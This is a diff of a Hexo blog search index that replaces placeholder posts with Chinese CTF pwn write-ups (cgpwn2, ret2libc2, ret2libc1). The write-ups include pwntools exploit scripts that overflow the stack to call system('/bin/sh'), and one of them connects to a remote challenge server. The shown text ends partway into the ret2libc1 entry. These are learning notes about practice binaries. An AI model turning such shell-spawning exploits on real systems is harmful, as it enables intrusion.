@@ -1,43 +1,233 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>first test blog</title>
-    <url>/posts/45a142c9/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="70b2dbd1295f428081ecc960e7ca50510d1cdc166130653acba8612ce5b927cd">36f29f3a8a3599dfb9e50adddc71ef174548472abf021572b844e1fc9f10cff5310bc35a82927b727f1393859cb8b18c283f596b33e3731ea95b8a8c4f66e76c1ae48e51061c18a16e9ed605050aba886c310be28f4796578c85a1afcfeec6c597acff4a7ac2d07e93c304df61b16fb5b35586459271d22c7cb5da793b108abd9630c9ed1fa6e4ed14e35ff5cb0ed564d85991e2cc27861a0f3742339d633121f031ba401f55b6c55df63a6fe44768126987fa884873bddd95104ea5c6d889b9ace9977e999c7dbf81fe532b77b1c8693027dfdd1d45017f92d43078e49c27f27be1b36b4fd50d8cb2a267ba5384fa751c46f5952aefbffec283d25bae2e7a189501b518789f7dad401bd35ae0bcb43bb9e232a09059a6f5d315f9e7d2be82577d70c6552c701b17d0f5b01bdc5a7d84fda591ca2ffc1cd4b47673dc54839f295d3bdeda32af40b0917943ff099618811e2290229cd20f56569f254e4e7533d07a970688183ab28fe324dc1e2b7849e335f8a1cae1c5781b62fd6e38df2c2819f136b234620841f0cf78a6f3d8eb85868b491942045a8e01843a6e19c87b7e9ab8da961f34666ed13022327998988ddee719d595aaea685c143f9a7ef26493884abbade78b6893eb40aafd052fc48af2607dc77824d001d7b5d8a05bbcbe0d532741ce8f6883ca81029e2c751439c95d644b83dfb85ed708a8b631785784e5cb4a0f783fe62f5923c17ed1d27383adb6cdf6ae4f628085d32378e6df12449d35d749ed4ed2fd82f3f4a12c09e5ea188af20e05b6ccb818d454fcc62c9f25a3a7ff0a2a4ff3dcc23e6f16b85f77d587db2c5d31175a9841af77afa43709bd09f4470abc4d9ddfe2ed6ff3c2912012ccd3f49a5171cb98256589f17d54116b1a963b7a21e993948948126c1eead44db56fb959d646b6fd99bd8efea2f71172a00135f89382eb1e5633234a212a850e017137dffee71f9957bc656db04ec0e5a5ef30fe3028980ebbf32a135d2e50c95727d737283c431e6a0f24cd7d67d020ebe87993aa23dcac8aaa601d6b39530749ee5219df3ae70701bb4c6214fa7896917c8f1f12b0b85272b264d7aac2b58bc60430018ade2d34b86b12f4dab3c207764dca7b10f56e9440a7339d3699a688b368670884e79e810d6cb3d7a2548dba2c7db49c36d2a6c19d695c43d2e4d1882bd79d10dd1bcf058b9fc65b6d5988fd802f2ba9c4f8e76ee81da67d12351f3ee3996d264dd3406ba53142801b27ea0c37131042ea678be0c361ba77161708f1e9fbe56f678095aaf336b9923fb87fedb1e9a543b59a3db3643b3a2b7ab681b4e1d92c9cbf747068c5625c7f824caafa439a2563768cc20845d2183a794c42b9f2d8a5355fb7442a7f871fcdfccf8b6abf0575e4a11f9939054213c82cdf7f534433011691a42a57be4db74af2fe8f3f58daf99a877b88e071e0812ef3233d16111d2480bf52e01a87202b301407373d5fe034c22a31a0227d2a8478030cc42e4bc80f4b72cb2c5e0535385ae0f7eb274951cc7a34ea0db7a82b04ddb3ec928982d8600b7baf16a96ffcf593d44b5345300de8f8abf51cc6e4d28d773b72a7c16e0f21845213fe5ab639cb09be3e0922eabb811fbb1ef40e825bd0070923b6738b04e8c4cdc35c72e7282fe1f749a0ee17f00575b0c61c8ba1706679cd2ff07dc8db740ba84f2e3fee9d6e7c17ccaa211f60b0cdec0831ffc65182d94973267ad6a7486aa8955ec27b4d0a4388b1201e5682dfd2f04e8731d9ba4601454f3f51c0440642b44ac0c9bc43d288fcd2bb6d1a666068861a7a5b6e824b752c37151cdb25e6fd06bb209957966741918e98bb052d850bd15c84d8f533ba0779330715cf8e1aeeeb26b9d3fecdfd8404bce9ba922f287cbd3cf7eff1b1c2cc02639a91b9485f81b988080aadfc93e0b0c5becba1bd558ac688482baab4abd0f951b5526059095d043423edd3494051abb5660106b8dd00302ea48d91e54deaf85a01108e1c009d98e97b81fa4db4aa8e367ea1d6d6c68b8fa66d726c06d6c3d1221f8a60490f8d8ef94041e3fc06d545f19f651934a2a28505cb59606f4f7220e84fcacbf3e5b35c448bc14fb26cba67004251f04c0220bbb925d49c8592d925f3775a8a3740c2cbc65bf79c976aee61da1d896f880a5e76f11a73d48e203cf0abb4e2a9a57b00d10732546a8e9a07a93fa98f9ae77b4108c291cb731a58705c650e59f7b481d5a760e9ae924d5ba9b393c84965056b10ade0bbc3ef6001f9f7ca1129f21a94569d8a0a4b0b0ee7411001044e6694f7ee8c0ccfb18bf7726b46466da92eab3c79757cb72231aab5938c8d14d8002ca608167c81dec2fd71d71e2208b0ebca37e7fb8a7da1607dc547be00979a4e8293ab090df916b661afdd4bf20a6e146e62f807288a6c4008ff3dc1713f45bb8bcf8d6aac16c49d89b9987b6b46a3818593508cc560d966e55e19e83c9350066a390a1f1004f86352b79e37fa0d8860eaf0f8aa499c52c203813d19536e8f68c896523d49824b7e9f55777a1b9c9229868315f3f471cdc887dcc2a418ce7c0a29ea75c82ea0efcd300c875c73b6c1dd71ea57228c44e2bc3ae6de68709be2e2a1baa44452c7bcba7005732986572b008e737311e1bb75666342606c4b0e76d81c4a182c53d46a1027c87963eb9c9fb62f2a9118542b2e75258f30157abee01225965b77fc7f303a80ff5fee72a10739c97522f168a5016e51b6f82abb1e8b2836e3441a5b4c7fd97a68734f5ccce8176cf925c030672a1af09f3ef72c428338f2b0a9126d66f4cefb2bd7401613c1a2a00b3205faed4864f0a9728a3b5502605442501e2492096cfdfbf007cde6b9644a1068f7331ca8f2959d6fe62828f15698b914a3b83ef188391ec5c5c2dd7f7a78e902cf1b3b12f16ccbcd79ae2298f2f5cc58b4fcfcdd2485e91f8ca44d105c1299dc89e7172bdb95ea774edce2bed3d2cebc7d9886de6d1a1cc96d56d0569b62ca7e8c1a9032e4ee90c04725d9ba786876b73021f287a6ead1812ca8c558b36d3271c334df687f15b43ffd441f92bd586bc5f3a118606c2d061ea8f3c3835e09370328f27bd3a5bf4d322cacd18c139fdc0843a1362a6042c74ea4319bc5946d23d391d50079fa3d32606173d0bcd70e9c52600ed1f273b36bd3e9a8dfee5795a0c7648bdb6e236f8f3e497b9f45c0eb0188a0276d5bc0b6c790753c35a5bf3ea860a73a19e66f759bf2a774d8753b398e47ae9c64208eac0ae1b0e3dbce718a97c29219878d74582fb61f796c531649d44e88793fb6d4e27c3e7e6a936966b374b8fcbef13cd2fa8307d39e565521f006690c62024ab2225c6869023fb519f7bea7c12dc5a96867d0836bab5e4fbe99fedd83f22595ba88aa4db1a4cb6a9f143245dea0075b5d1d7f065cccfa78aa6dc1d5c1e7d715d3eaa2fed7ba3054e7bc6f033363c25aa7791d337b7be02a03e853c950b2554def3967c210b9f9b1a677a9f2d1ec9f43e6788cea18fa002be23a5445971560aa24cb0a9309d2f3f878aad8e1707f36e4975c99211b0503f27b059228cd494fe8f8961ae201fa4676c60774cc107379f81c8a7bef3237584d0635b8ea9911c53c77e25e65dcd4c599c29dd7243db6d0cdb8b85ba749d3a4191c40a363da8f5691d963ca0b6e17d296acd27e4ba9df497ef7dea5b5d7f34dc73175cf09301a264e6b15e52560b5e32f15ec469533ea034b9254512add2546aecf4471d9394350e976e0e1b8af3040c22aa9180276204c12b517c85921c1462871d754257f11ef8479492844ae00c49908d0539f9599354e7e7e0f3b9570922e7f17f13b7d0ae823094473a3271218da2bf5e301b66e6b78b9bfc19f35b9ad148e795bd3c2e75f05d1cd06a0a126232c3bbacf0ae0020002bbb0b7f1f23fc184f0507d968158973edb5e70f2738bf6ad5fd859e1bd6d996267d2e33073a71e0f71ca67e9b615823d452880b3f78046d17f7fe75a24bf240f6fa1c1d8f0849ce926505eb27485863358a03d424e66a91cd6016f023ed5d48d7a431db83bea5e9500b894b1a9a5179a3303b5e1cc5de1f683464f219c71d4a413d0822c7dd2ca922fd274ff9ee3813aad2b889f051a0f45a32bef5227caedb103f95471ef3c3d998522dfa63adbcc4c5c12292b85b865f96e4ccae4a349fd542d1dee36c158227f7f9e238fce37b38d5734eb77802c369bd7249bd45e11a210e4c84eabd587182ef1543ea4c4f3a8bde0e3c80bad2ccb00339ef1df61ef125a1fe26a4dd55f2c0bf5acbeb23007643bf7d340b6a3409415ddb8bfeec53b5a9cfad1bfa3d3375c730c6a34a8a6d6163d35be92067d7374a7bf9ed8b666418540056667ec8fe2fed24105666127d2a7ff2e8612ef6764408462cdaa2e8a1dc416c853194dcfb0d506ff0920ce4cb56df0d6455623888cd42bc920783ae141263ee294247f377032dce09d7be38c8b273cd57abb34f2568deaec971dbbe237613b4970454129259f56ecd909ccc2ef687af9b4a210b740b7ef47546bd6f9d699f148e6e5755d3ef3ace4af2f88f750e5e273e918a3e2cc2cacbf991ee1d246ba0fb680b6b960dbdbb321b4e0f2f9ed00a77bd46cc2ac4087ab9a8c7ed07a376c8d01fe5c90ae6fe8610aad4a6146a20f59154cf87f85a75926e69711cb05a7ea85c8261c66124fe191cb73238534d7093bef696f59c1113c62309cbea771ce867405c8122ccadf62a63ea3d7d4b1ce14d24da05d4a33dbf5df06745d03f4997bff336dfaaeb175eb7fb9281d09d175e9c5071d05e805394302b5360647dee7dd66554fd6eeefc4b6046b370af90208dc3e5306797615065961bcd8b8f8ef8ee66200c8b80df88ec5673af6b1f836fdab111a1c222f726ff5ed66c9875054dff058c6bd00e652fe3a331bf03fd2d7a2e88fe7acebc45dbd3082f563c1809f02652fb7ac9e2809c245d449c980ad9a1f502cc52f7dc2a027564255eca9c2c8743d631a920164edbe497bfb1bde715404b98a6ecaf4a05c36ddc9c103215c41de87a564d8b80a7c96b4e39146f0a639e48b99afaede1e5daf1c2246d9e8836db2ef1923dca647f5bdb37d83942d74345f5d024b583fe2c9f2e30b624efc7d04604bf3cbda2a623471a833786e3992e76db1c22d8c0210b25c76d3d0912fafd242cbd3799da52e3b9bc6d2e1932627a295af6c515f94bb677773ae2df0c4f24f856bad163764ddee4a428d8e17fca6626e449aa00a56f360c865eb9cddb815377764f58c02aa0d6ae2cc5cb8e6a734d0ea0d0e080ce666af0eacc025a904c8bf7d91cf19677b9a6da28d18783d3603f170b68a3a576364e0abcecf756fd7906188c6d642754a9d943b58186013b3e7f6c89045a4e6d3f4d0e88a9b8c95a878c329535d0de78064a7f421f0ff6a90ad61d71c365dbf49966b8e1a5172f6723d752be2c90c215e31f72f547f40ed5d8ca2e90f5db3cc22283f900067b64f08cf42c34bab5599ff4e5e6a5fcb8aa8259311234080abb9f6b823d7f1e88103a3a01a85d729784824ef208883baa4132f71dd8712c3211da466406726c05e3a1c73ba8bf8f36e446056ae8a954182f29c36b5ab7f8d404a629571bfa3f1c27149b2f8d355d5ec5ea16dd43db0e35bf6d2559dcbfd3a825e94785a4da089815ee84cc0e78e090dafd7483a8c2cbce0ba708cb265fb9636a4dc026b61cbbed6476225f58aad2020b3b9f0855ffc10319f029c50273eda349bc255bf0143561831b10808f3e5939dc80d70c77b0bed8c1f594c16bcf8116a09947de5297c2640609bb665ae133811f3d08fc1ddcf8a1eb01e342be37b8ef7525e70984db01b16b01c86964cb93b9101d3b49a64feadd22258eff3aa2c08dfe74002858427124081b369666a11a071a61659644e1689ab18a09d4265c517d574f4d53b3c9b6c2879c754b1fb25a1d577ef2ca55401cbd811927a77f129d5238ac84321e161568148edb233edf6625cc5ea9908d3d6f6df3f355730fbf9539dea254de6da3282ba3f74c3d4b5db7e2745fa30a145f390f5bdb3f345925cf55a37777ec75b8449d73c7ba68f4b3c8a553f0236e898dda7107376dde42b727196c0a969a5cfc182ab36681d91a3e143f4511be58d6f12a128d4d5950896734abfbb803e6d7df110619b30279ebca815f1819fc6ef876bdf531f62a606feb06ed0ea0f94b6dbe3cf643e33c046df7d76c34cec86607818bc12f0cf70222c74c022455115115baea60fce25c28b6a2646c20bea36132d8df03b965e9e25d3dd26559b78ebe29d77c9e35daf5f3c60f1279291d8f08fd44f5fe2e08d9b6828e4abeb29c00bb3c19e97eb99d0f7a43670ffe0c6dc0be7fb3c94529f1760610b9a2111edae868b6ecacba11309d5f9583413103fd3391b29e866f8cafad68373a1d69dc0907d3ace9005c66f75e495b742c23f31ce55100c5f8e58d435c67a4541f06ef15e9feb99ea3ac5cf6010f16fc1724297f6b6d7444ee400fefbeb173e763bf60448e377daeb4b880cc83473a0765ee495d6c4e56d39a12f0e72cb504ece4e21af36a455895ed24fe2fcc19a4cb5add36f9263fa0508cacff4b68b41e748c15a1027a3aa53767ef2605a7b01b9a32d06557f660907eba002b722cfa89bb6d67e7920428ea4f2a7def272b55e287a74f026db3bdce5c2e6791485463c5aa33ae69becde238d30943a28f8186fa2c478c2b3f0566ef79f10ba737a1f26b42d7755fdd9d0fc81755cc6c4aff687221eb14e67e54dd65981de6261da5698d8523553eafe39620f7daec393fd1869ca492a6ec6c94da7b60f2ceb680a0ba4fbdc7667299a032cfad68875a5a30553e458a8eb408c2d630775507287d38db2314ad91cb2f476006ebf9a5ad70160214b64469697980eae162acf05ea77c92235f9919e6bae621b001a5b5db79bc94e5db62f18f7dacc1c60771711f4ca3ae3ce0629fc01b8eaf439363ed6d68470d7111ad763beaf8d53c3803b003ae1c0cbdb45c8497a0a6c8a44147fa457cf3547ca786252a5cd58e21e156bd406b2b69653859118c22e1f239b18a5ff137e1f2aa8874f27d1968fa16673412eb2f9279883605b527f11808b395f38a9ea1233103e59fe4a512b2dc1a62a43835b1a2d8a2310a2df377501fac1ca077a4e747fc236fca77b91a8d87881e1fd3af3ef2814eafbf2cdce6815be2f88baafcbc4ad4e0da3ee5e402aa758aff0e13f386cd6dd7dceb3574eb28682e05f894b09ba2fb5486d8d4d49bd8d64308a3bd2128b329cf40d6b70a02485ad20f86b9a7c8fc254ddabc1593fcdc79d5f2edb0961226a329c23fd6b9d1737ac1d683b23a165179ff4430bf4000bc4f71208cb674310e3db52bad69000219d5f9257dc32ec654519e3c3c6bed0792129ded7a2ef31ef1be86c4a7feacff5d340dd6dfb5cf9707f76ed5b27a49fbb8999614d3987e900e9280f7550061d14b6eb8f44cc88d19c6c1f556293e81487b568f38169b009f5ee7582b020fef531efbdddd86212fc6f209219263a21c8be97b9a7172de711c689966950efbe7db657f68be7a637b2474f9444070f1ac5895e4c362bdeaae67b653fadf72931b2bd8ba5afae5c16b58907916f2a03f8871ab1d0eaecc83998f365fa426aaac6b2c9e080655f08cd35dedd1aee807b986238cb8643fa68d5ced0e9d4c7f05752a2c875e1f3d2d7170317cde645cdc95ad0daf9674c72bbdbef10409afb08170f68e48f0fdcee8d10c67ee1f5f7f0eead5bffe99c4816072b49146c2d080d218a9e6b89389dbbf7e5c83d0dc7b0d636716e3225bcae1175360a834b51064ac7f1cf9cf253aa4e55a39f7b178def3d3e4b54188ffe08f4163dd2fa6a35d13a95a46f0c18bedece803b5da27f1a3146754a25270badbfd94a95d0e3116d77090a1c90f376fe74d2dce0bc3fa669f2a280b3cdba24fc9f11631d3356ab836f2dce2bbda45c4bb373cf26db5fc467fbe0993be35538e51b3a059314868517c785b7e55cd8a29bbcd83e6bb0acdc266d08755715ad88b2f2ddb99b6ec3980b268051468b49ae53013828feefeab0609e7d6dd5876f35c6fd4b7c63b8a62fa23cd937b9c0c80808f2a388dabf804478d0a9a8a037cb90ef867bca2ce27edf65514727287f8db4dea771c26eafdaf11a4fb3120514ce61aa9a0be25225c585e27efb23280842b2d13fa5666bf3fc77e2fb8f680e60bb648afdeae0c09ba82cd9e96bd263d8fd135c73290bfcfde4fd575411fcbe693e93baf6572515ac7a621fff8aedbb9e982addfa35d9d44bf09a8c899c15a242aa3081145bd0eee3dc711b6f07d638d7e655964d2f741f0e507440fbdf80be1fa0b83b4a10cf98b89786f69933f28467b2061d93896288d95dd1cb866528fe18785876b919d973cce77e3b7f7d9459ef3299e114a5284c1db9754c80d748a81e45fdb48ce8e55395660a44eae177c438229d067ea691cbc3cc69750af951cb8107092ca74d215d2125b43dfd7b2e9b5210335eaeaec17252ab8b1a3ffd6d9ce4982fdd2b168b2eb76f6f4a1cb761ef545761b0982d64507a1b57afe35c337215ee7495189bd4da79a3817e4f0638f6827bb5fef4f7eeca898df5ca5c4d685c98675b4360beda510db82f9902ab1f5c6cb35f46d661d3b652c02ecb023af584e42b3fd80b885d73da2188e2fb6232d50729583cc61544562835e34ce3a059057f5446f154ea2ca7bf451c8bb34e9d3ec4804c17589e4f95ef0f383a22346191e5cde2313d605a2fd733fc6259084aa48e0dfc0273f1f3e3b911f662e765f61101e5751d43339a57c471d69b1e5be818c0f23885980df50aff058953d53dba70753e1bb2cf451c47df22fcc6bda629dc22a521bda8099c2af9916c87dbfa52d5a3530a95440b6843f5a409480c03af7101c2535dbac4c2458dd5eb16951aaba27c9f2b596758768f864a87822733e3ebcaf34559afba424538d31d9ec77e1a511fb6a0fad36fc59b375171792c67efd15b398f63aa16bbca64abc8075a0b01834297ec573732cf05601ad3517d50ef2077fc69cecc8382e6c67568f805fc45d471cd4d077194da04b8070abb02a35cfc40da7341fb9193d0bf9abca3e77fa46b2a11385c0b5d0dc5cb7a60e36dec17507ac939a37557f6a33a</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+    <title>week2 T5</title>
+    <url>/posts/46e9d6ae/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-cgpwn2"><a href="#T5-cgpwn2" class="headerlink" title="T5 cgpwn2"></a>T5 cgpwn2</h2><blockquote>
+<p>2023-01-09WP<br>攻防世界 pwn题</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec——32-bit，开启NX保护</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA中打开window发现这题又是一个找不到&#x2F;bin&#x2F;sh的<br>但是在pwn函数中还是找到了system函数的<br><img data-src="https://pic4.zhimg.com/80/v2-068880d6f0f1427b812cd98bee561577_1440w.webp"><br>然后我们来看hello函数的反汇编代码<br><img data-src="https://pic4.zhimg.com/80/v2-c5dd01b36ac83fcdc19cf8ed3f804d0b_1440w.webp"><br>好像有点复杂，简单来说就是前面先定义了一堆变量，然后条件判断先不看了先看后面的<br>首先要求我们输入一个名字，通过fgets函数完成，并且从键盘最多只能读取32h个字符到name<br>然后再通过gets函数从键盘读取字符到s区域，没有输入字符数量的限制<br>其中name是bss段的一个大小为34的区域，<br><img data-src="https://pic3.zhimg.com/80/v2-a6b3d88fcbe601a724cad07d655b85f6_1440w.webp"><br>s是长度为0x26个字节的区域<br><img data-src="https://pic1.zhimg.com/80/v2-a33446043ab1e9de86ee374db4c9dd28_1440w.webp"><br>于是我们可以向name区域输入&#x2F;bin&#x2F;sh,然后让这个地址作为system函数的参数，而s则用来进行栈溢出，并让溢出的返回地址为system函数的地址</p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(’61.147.171.105‘，51582)</span><br><span class="line">target = 0x804855A</span><br><span class="line">binsh = 0x804A080</span><br><span class="line">payload = b&#x27;a&#x27; * 0x26 +b &#x27;bbbb&#x27; #覆盖s和ebp的数据</span><br><span class="line">                 + p32(target) + p32(binsh)#返回gets函数的地址和参数</span><br><span class="line">a = r.recvuntil(&#x27;e\n&#x27;)</span><br><span class="line">p.sendline(&#x27;/bin/sh&#x27;)#向fget函数发送字符串</span><br><span class="line">a = r.recvuntil(&#x27;:\n&#x27;)#等待接受到括号内的信息后再运行下面的内容</span><br><span class="line">p.sendline(payload)#发送payload</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>好像不要a &#x3D; r.recvuntil(‘e\n’)，a &#x3D; r.recvuntil(‘:\n’)也可以……</p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p><strong>疑问：</strong><br><del>有些奇怪的是，这一题应该来说是和ret2libc2类似的题目，但为什么我看攻防世界的题解返回system函数地址的时候它并没有返回该函数的plt处，而是返回的 call    _system处的地址？</del></p>
+<p>A：好像有点懂了，这一题没有两个gadget对吗？不用像ret2libc2那么麻烦</p>
+]]></content>
       <categories>
-        <category>WP</category>
+        <category>wp</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
+        <tag>ctf</tag>
+        <tag>攻防世界</tag>
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/posts/4a17b156/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+    <title>week2 T4</title>
+    <url>/posts/31eee638/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ret2libc2"><a href="#T4-ret2libc2" class="headerlink" title="T4 ret2libc2"></a>T4 ret2libc2</h2><blockquote>
+<p>2023-01-09WP<br>ctf-wiki 基础rop</p>
+</blockquote>
+<span id="more"></span>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec——32-bit，开启NX</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>拖入IDA看看<br>危险函数和ret2libc1相同都是gets<br>不同的是这次没有&#x2F;bin&#x2F;sh给我们用了<del>我还找了好久来着……</del><br>但是system函数还是有的<br>那我们先找出system的地址0x08048490<br><img data-src="https://pic1.zhimg.com/80/v2-d7208c51601dfd63bece7bfa14f509f4_1440w.webp"><br>接下来我们得想办法弄出个&#x2F;bin&#x2F;sh来<br>由于程序已经开启NX保护，我们无法直接写入栈<br>所以思考在bss段写入字符串  说实话，这个地方第一次看真的怎么都想不到……<br>然后接下来我又不会了，怎么找到bss…….博客上好多方法看得我头晕目眩，又还不会用ROPgadget……<br>最后我直接在IDA里快捷键G了一下跳到了.bss段<br>发现里面有个buff2(设计好了的吧？)，我们可以用gets函数写入&#x2F;bin&#x2F;sh到buff2<br><img data-src="https://pic1.zhimg.com/80/v2-02c0edc80f9a8a5d0576827773403920_1440w.webp"><br>去找gets的地址  得到0x8048460<br><img data-src="https://pic1.zhimg.com/80/v2-5ccf0533f58826d407436ee4665c121c_1440w.webp"></p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>用gdb暴力求出偏移量<br><img data-src="https://pic1-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"><br>终于可以写exp了</p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">buf2 = 0x804a080</span><br><span class="line">payload = flat( [b&#x27;a&#x27; * 112, gets_plt,   system_plt, buf2,buf2])</span><br><span class="line">#先覆盖溢出，返回gets函数的地址，</span><br><span class="line">#接着返回执行system函数的地址，然后传入gets函数参数buf2的地址,system函数的参数buf2</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(&#x27;/bin/sh&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>这篇<a href="https://zhuanlan.zhihu.com/p/53357764#:~:text=%E5%85%B6%E4%B8%AD%E5%85%B3%E9%94%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E6%98%AF%EF%BC%9A%20payload%20%3D%20flat%20%28%5B%27a%27%20%2A%20112%2C%20gets_plt%2C,buf2%2C%20system_plt%2C%200xabcdabcd%2C%20buf2%5D%29%20%E7%9B%B8%E4%BF%A1%E6%9C%89%E7%9A%84%E6%9C%8B%E5%8F%8B%E4%BC%9A%E4%B8%8D%E6%98%8E%E7%99%BD%EF%BC%8C%E4%B8%BA%E5%95%A5%E6%9C%89%E4%B8%AA%20%5Bgets_plt%2C%20pop_ebp%2C%20buf2%5D%EF%BC%8C%E8%BF%99%E6%A0%B7%E7%9A%84payload%E5%B8%83%E7%BD%AE%E3%80%82">文章</a>和这篇<a href="https://www.jianshu.com/p/4928e726a43f">博客</a>挺不错的<br>还有<a href="https://blog.csdn.net/ATFWUS/article/details/104565483">这篇</a></p>
+<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p><strong>疑问：</strong><br>ctf-wiki的exp是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line"></span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">pop_ebx = 0x0804843d</span><br><span class="line">buf2 = 0x804a080</span><br><span class="line">payload = flat(</span><br><span class="line">    [&#x27;a&#x27; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(&#x27;/bin/sh&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>[‘a’ * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2]为啥还需要一个 pop_ebx呢？<br>好像看到有博客说是为了堆栈平衡是吗？<br>可以用0x04中的exp吗？（没有环境没办法自己试）A：好像是可以的</p>
 ]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>ctf-wiki</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week2 T3</title>
+    <url>/posts/af8a739b/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-ret2libc1"><a href="#T3-ret2libc1" class="headerlink" title="T3 ret2libc1"></a>T3 ret2libc1</h2><blockquote>
+<p>2023-01-09WP<br>ctf-wiki 基础rop</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x00-ctf-wiki中的原理解释"><a href="#0x00-ctf-wiki中的原理解释" class="headerlink" title="0x00  ctf-wiki中的原理解释"></a>0x00  ctf-wiki中的原理解释</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道 system 函数的地址。<br><strong>0x01</strong><br>file checksec——32-bit，开启NX<br><img data-src="https://pic2.zhimg.com/80/v2-80ff23ddf6fa9ad28c2d42d4fbe68d4d_1440w.webp"></p>
